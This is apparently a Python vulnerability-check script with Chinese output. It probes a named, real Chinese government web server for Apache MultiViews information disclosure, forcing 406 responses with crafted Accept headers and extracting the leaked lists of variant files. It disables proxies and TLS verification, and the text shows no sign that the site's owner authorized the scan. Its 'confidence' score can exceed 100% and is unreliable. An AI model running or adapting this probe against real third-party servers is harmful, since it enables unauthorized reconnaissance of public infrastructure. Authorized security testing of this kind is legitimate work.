import requests
import re

requests.packages.urllib3.disable_warnings()

import os
os.environ.pop('HTTP_PROXY', None)
os.environ.pop('HTTPS_PROXY', None)
os.environ.pop('http_proxy', None)
os.environ.pop('https_proxy', None)

proxies = {"http": None, "https": None}

target = "http://mas.changchun.gov.cn/icons/index"

pc_ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

print("=" * 60)
print("[1] 基线测试 - 默认Accept头")
print("=" * 60)

try:
    resp = requests.get(target, headers={"User-Agent": pc_ua, "Accept": "*/*"}, timeout=10, proxies=proxies, verify=False)
    print(f"状态码: {resp.status_code}")
    print(f"Content-Type: {resp.headers.get('Content-Type', 'N/A')}")
    print(f"Content-Length: {len(resp.text)}")
    
    cl = resp.headers.get('Content-Location', 'N/A')
    vary = resp.headers.get('Vary', 'N/A')
    tcn = resp.headers.get('TCN', 'N/A')
    
    print(f"Content-Location: {cl}")
    print(f"Vary: {vary}")
    print(f"TCN: {tcn}")
    
    if 'negotiate' in vary.lower() or tcn.lower() == 'choice':
        print("[!] 发现Multiviews特征响应头！")
    
except Exception as e:
    print(f"访问失败: {e}")

print()
print("=" * 60)
print("[2] 触发406测试 - Accept: text/html")
print("=" * 60)

try:
    resp_html = requests.get(target, headers={"User-Agent": pc_ua, "Accept": "text/html"}, timeout=10, proxies=proxies, verify=False)
    print(f"状态码: {resp_html.status_code}")
    print(f"Content-Type: {resp_html.headers.get('Content-Type', 'N/A')}")
    print(f"Content-Length: {len(resp_html.text)}")
    
    if resp_html.status_code == 406:
        print("[!] 返回406 Not Acceptable")
        if 'Available variants' in resp_html.text or '可用变体' in resp_html.text:
            print("[!] 发现变体文件列表！Multiviews漏洞确认存在！")
            variants = re.findall(r'<li><a[^>]*>([^<]+)</a>', resp_html.text)
            print(f"发现 {len(variants)} 个变体文件:")
            for v in variants:
                print(f"  - {v}")
    else:
        print(f"未返回406，状态码: {resp_html.status_code}")
        
except Exception as e:
    print(f"访问失败: {e}")

print()
print("=" * 60)
print("[3] 测试不同Accept类型返回不同文件")
print("=" * 60)

accept_types = [
    ("image/gif", "GIF图片"),
    ("image/png", "PNG图片"),
    ("image/jpeg", "JPEG图片"),
    ("text/html", "HTML页面"),
    ("application/pdf", "PDF文档"),
]

results = []
for accept, desc in accept_types:
    try:
        r = requests.get(target, headers={"User-Agent": pc_ua, "Accept": accept}, timeout=10, proxies=proxies, verify=False)
        ct = r.headers.get('Content-Type', 'N/A')
        cl = r.headers.get('Content-Location', 'N/A')
        clen = len(r.content)
        results.append((desc, accept, r.status_code, ct, cl, clen))
        print(f"[{desc}] 状态码: {r.status_code}, Content-Type: {ct}, Content-Location: {cl}, 大小: {clen}")
    except Exception as e:
        print(f"[{desc}] 失败: {e}")

print()
print("=" * 60)
print("[4] 验证结论")
print("=" * 60)

score = 0

try:
    vary_val = resp.headers.get('Vary', '')
    tcn_val = resp.headers.get('TCN', '')
    
    if 'negotiate' in vary_val.lower():
        score += 25
        print("✓ Vary头包含negotiate (+25分)")
    if tcn_val.lower() == 'choice':
        score += 25
        print("✓ TCN头为choice (+25分)")
    if resp.headers.get('Content-Location'):
        score += 15
        print("✓ Content-Location头存在 (+15分)")
except:
    pass

try:
    if resp_html.status_code == 406 and 'Available variants' in resp_html.text:
        score += 35
        print("✓ 406响应包含变体列表 (+35分)")
except:
    pass

unique_locs = set()
for r in results:
    if r[4] != 'N/A':
        unique_locs.add(r[4])
if len(unique_locs) >= 2:
    score += 20
    print(f"✓ 不同Accept返回不同Content-Location ({len(unique_locs)}种) (+20分)")

print()
if score >= 50:
    print(f"[结论] Apache Multiviews漏洞存在 (置信度: {score}%)")
else:
    print(f"[结论] 漏洞不存在或证据不足 (置信度: {score}%)")
